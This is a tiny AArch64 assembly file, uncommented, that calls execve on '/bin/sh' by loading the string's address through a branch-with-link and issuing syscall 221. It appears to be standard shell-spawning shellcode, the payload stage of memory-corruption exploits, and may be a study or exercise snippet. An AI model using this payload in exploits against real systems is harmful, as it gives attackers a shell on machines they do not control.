        .text
.globl _start

_start:
        movz x1, #0x00
        movz x2, #0x00

        bl sstart
sh:     .asciz "/bin/sh"

sstart: mov x0, lr
        movz x8, #0xdd
        svc #0
